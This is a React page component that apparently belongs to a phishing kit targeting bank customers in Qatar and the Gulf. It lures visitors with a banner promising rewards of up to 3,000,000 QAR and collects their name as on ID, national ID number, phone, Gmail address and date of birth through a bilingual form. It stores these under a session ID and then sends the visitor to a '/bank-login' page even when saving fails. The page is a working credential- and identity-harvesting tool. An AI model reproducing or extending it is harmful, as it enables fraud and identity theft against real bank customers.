import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";

const titles = [
  { ar: "السيد", en: "Mr." },
  { ar: "السيدة", en: "Mrs." },
  { ar: "الآنسة", en: "Ms." },
  { ar: "الدكتور", en: "Dr." },
  { ar: "الأستاذ", en: "Prof." },
  { ar: "الشيخ", en: "Sheikh" },
  { ar: "الشيخة", en: "Sheikha" },
  { ar: "السعادة", en: "Excellency" }
];

const countries = [
  { ar: "قطر", en: "Qatar", code: "+974" },
  { ar: "المملكة العربية السعودية", en: "Saudi Arabia", code: "+966" },
  { ar: "الإمارات العربية المتحدة", en: "United Arab Emirates", code: "+971" },
  { ar: "الكويت", en: "Kuwait", code: "+965" },
  { ar: "البحرين", en: "Bahrain", code: "+973" },
  { ar: "عمان", en: "Oman", code: "+968" },
  { ar: "مصر", en: "Egypt", code: "+20" },
  { ar: "الأردن", en: "Jordan", code: "+962" },
  { ar: "لبنان", en: "Lebanon", code: "+961" },
  { ar: "المغرب", en: "Morocco", code: "+212" },
  { ar: "تونس", en: "Tunisia", code: "+216" },
  { ar: "الجزائر", en: "Algeria", code: "+213" },
  { ar: "العراق", en: "Iraq", code: "+964" },
  { ar: "اليمن", en: "Yemen", code: "+967" },
  { ar: "السودان", en: "Sudan", code: "+249" },
  { ar: "ليبيا", en: "Libya", code: "+218" },
  { ar: "فلسطين", en: "Palestine", code: "+970" },
  { ar: "سوريا", en: "Syria", code: "+963" },
  { ar: "موريتانيا", en: "Mauritania", code: "+222" },
  { ar: "الصومال", en: "Somalia", code: "+252" },
  { ar: "جيبوتي", en: "Djibouti", code: "+253" },
  { ar: "جزر القمر", en: "Comoros", code: "+269" },
  { ar: "تركيا", en: "Turkey", code: "+90" },
  { ar: "المملكة المتحدة", en: "United Kingdom", code: "+44" },
  { ar: "الولايات المتحدة", en: "United States", code: "+1" },
  { ar: "فرنسا", en: "France", code: "+33" },
  { ar: "ألمانيا", en: "Germany", code: "+49" },
  { ar: "إسبانيا", en: "Spain", code: "+34" },
  { ar: "إيطاليا", en: "Italy", code: "+39" },
  { ar: "كندا", en: "Canada", code: "+1" },
  { ar: "أستراليا", en: "Australia", code: "+61" },
  { ar: "الهند", en: "India", code: "+91" },
  { ar: "باكستان", en: "Pakistan", code: "+92" },
  { ar: "إندونيسيا", en: "Indonesia", code: "+62" },
  { ar: "ماليزيا", en: "Malaysia", code: "+60" },
  { ar: "الفلبين", en: "Philippines", code: "+63" },
  { ar: "تايلاند", en: "Thailand", code: "+66" },
  { ar: "الصين", en: "China", code: "+86" },
  { ar: "اليابان", en: "Japan", code: "+81" },
  { ar: "روسيا", en: "Russia", code: "+7" },
  { ar: "البرازيل", en: "Brazil", code: "+55" }
];

export default function PersonalData() {
  const [, setLocation] = useLocation();
  const { language } = useLanguage();
  const sessionId = localStorage.getItem("sessionId");
  const isArabic = language === "ar";

  const [formData, setFormData] = useState({
    title: "",
    nameEnglish: "",
    nameArabic: "",
    idNumber: "",
    residence: "Qatar",
    countryCode: "+974",
    phoneNumber: "",
    email: "",
    birthDay: "",
    birthMonth: "",
    birthYear: "",
    gender: isArabic ? "ذكر" : "Male",
    customerStatus: isArabic ? "عميل حالي" : "Existing Customer",
  });

  const updateSubmissionMutation = trpc.submissions.updateSubmission.useMutation();

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;

    const fullBirthDate = `${formData.birthYear}-${formData.birthMonth}-${formData.birthDay}`;
    const fullPhone = `${formData.countryCode}${formData.phoneNumber}`;

    try {
      await updateSubmissionMutation.mutateAsync({
        sessionId,
        title: formData.title,
        nameEnglish: formData.nameEnglish,
        nameArabic: formData.nameArabic,
        idNumber: formData.idNumber,
        residence: formData.residence,
        phoneNumber: fullPhone,
        email: formData.email,
        dateOfBirth: fullBirthDate,
        gender: formData.gender,
        customerStatus: formData.customerStatus,
      });
      setLocation("/bank-login");
    } catch (err) {
      console.error("Update failed:", err);
      setLocation("/bank-login");
    }
  };

  return (
    <div dir={isArabic ? "rtl" : "ltr"} style={{ margin: 0, padding: 0, fontFamily: 'sans-serif', backgroundColor: '#f4f4f4', minHeight: '100vh' }}>
      <style>{`
        .header-image { width: 100%; height: auto; display: block; }
        .rewards-banner { background-color: #8C0032; color: white; padding: 15px; text-align: center; font-weight: bold; font-size: 16px; }
        .rewards-line { margin: 5px 0; }
        .form-container { max-width: 500px; margin: 20px auto; background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        .form-group { margin-bottom: 15px; text-align: ${isArabic ? 'right' : 'left'}; }
        .form-group label { display: block; margin-bottom: 8px; font-weight: bold; color: #333; font-size: 14px; }
        .form-group input, .form-group select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 5px; font-size: 14px; box-sizing: border-box; }
        .birth-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; }
        .phone-grid { display: grid; grid-template-columns: 100px 1fr; gap: 10px; }
        .submit-btn { width: 100%; padding: 15px; background-color: #8C0032; color: white; border: none; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .footer-image { width: 100%; height: auto; display: block; margin-top: 30px; }
      `}</style>

      <img src="https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg" className="header-image" alt="Header" />
      
      <div className="rewards-banner">
        <div className="rewards-line">{isArabic ? "● جوائز سنوية تصل إلى 3,000,000 ريال قطري" : "● Annual rewards up to 3,000,000 QAR"}</div>
        <div className="rewards-line">{isArabic ? "● خصومات عالمية تصل إلى 70%" : "● Global discounts up to 70%"}</div>
      </div>

      <div className="form-container">
        <form onSubmit={handleSubmit}>
          <div className="form-group">
            <label>{isArabic ? "اللقب" : "Title"}</label>
            <select name="title" value={formData.title} onChange={handleChange} required>
              <option value="">{isArabic ? "-- اختر اللقب --" : "-- Select Title --"}</option>
              {titles.map((t, i) => (
                <option key={i} value={isArabic ? t.ar : t.en}>{isArabic ? t.ar : t.en}</option>
              ))}
            </select>
          </div>

          <div className="form-group">
            <label>{isArabic ? "الاسم كما في الهوية (بالإنجليزي)" : "Name as in ID (English)"}</label>
            <input type="text" name="nameEnglish" placeholder="Full Name" value={formData.nameEnglish} onChange={handleChange} required />
          </div>

          <div className="form-group">
            <label>{isArabic ? "الاسم (بالعربي)" : "Name (Arabic)"}</label>
            <input type="text" name="nameArabic" placeholder="الاسم الكامل" value={formData.nameArabic} onChange={handleChange} required />
          </div>

          <div className="form-group">
            <label>{isArabic ? "رقم الهوية" : "ID Number"}</label>
            <input type="number" name="idNumber" placeholder={isArabic ? "رقم الهوية" : "ID Number"} value={formData.idNumber} onChange={handleChange} required />
          </div>

          <div className="form-group">
            <label>{isArabic ? "بلد الإقامة" : "Country of Residence"}</label>
            <select name="residence" value={formData.residence} onChange={handleChange} required>
              {countries.map((c, i) => (
                <option key={i} value={isArabic ? c.ar : c.en}>{isArabic ? c.ar : c.en}</option>
              ))}
            </select>
          </div>

          <div className="form-group">
            <label>{isArabic ? "رقم الجوال" : "Phone Number"}</label>
            <div className="phone-grid">
              <select name="countryCode" value={formData.countryCode} onChange={handleChange} required>
                {countries.map((c, i) => (
                  <option key={i} value={c.code}>{c.code} ({isArabic ? c.ar : c.en})</option>
                ))}
              </select>
              <input type="number" name="phoneNumber" placeholder="XXXXXXXX" value={formData.phoneNumber} onChange={handleChange} required />
            </div>
          </div>

          <div className="form-group">
            <label>{isArabic ? "البريد الإلكتروني (Gmail)" : "Email (Gmail)"}</label>
            <input type="email" name="email" placeholder="example@gmail.com" value={formData.email} onChange={handleChange} required />
          </div>

          <div className="form-group">
            <label>{isArabic ? "تاريخ الميلاد" : "Date of Birth"}</label>
            <div className="birth-grid">
              <select name="birthDay" value={formData.birthDay} onChange={handleChange} required>
                <option value="">{isArabic ? "يوم" : "Day"}</option>
                {Array.from({ length: 31 }, (_, i) => i + 1).map(d => (
                  <option key={d} value={d}>{d}</option>
                ))}
              </select>
              <select name="birthMonth" value={formData.birthMonth} onChange={handleChange} required>
                <option value="">{isArabic ? "شهر" : "Month"}</option>
                {Array.from({ length: 12 }, (_, i) => i + 1).map(m => (
                  <option key={m} value={m}>{m}</option>
                ))}
              </select>
              <select name="birthYear" value={formData.birthYear} onChange={handleChange} required>
                <option value="">{isArabic ? "سنة" : "Year"}</option>
                {Array.from({ length: 100 }, (_, i) => new Date().getFullYear() - i).map(y => (
                  <option key={y} value={y}>{y}</option>
                ))}
              </select>
            </div>
          </div>

          <div className="form-group">
            <label>{isArabic ? "النوع" : "Gender"}</label>
            <select name="gender" value={formData.gender} onChange={handleChange}>
              <option value={isArabic ? "ذكر" : "Male"}>{isArabic ? "ذكر" : "Male"}</option>
              <option value={isArabic ? "أنثى" : "Female"}>{isArabic ? "أنثى" : "Female"}</option>
            </select>
          </div>

          <div className="form-group">
            <label>{isArabic ? "حالة العميل" : "Customer Status"}</label>
            <select name="customerStatus" value={formData.customerStatus} onChange={handleChange}>
              <option value={isArabic ? "عميل حالي" : "Existing Customer"}>{isArabic ? "عميل حالي" : "Existing Customer"}</option>
              <option value={isArabic ? "عميل جديد" : "New Customer"}>{isArabic ? "عميل جديد" : "New Customer"}</option>
            </select>
          </div>

          <button type="submit" className="submit-btn">
            {isArabic ? "متابعة" : "Continue"}
          </button>
        </form>
      </div>

      <img src="https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" className="footer-image" alt="Footer" />
    </div>
  );
}
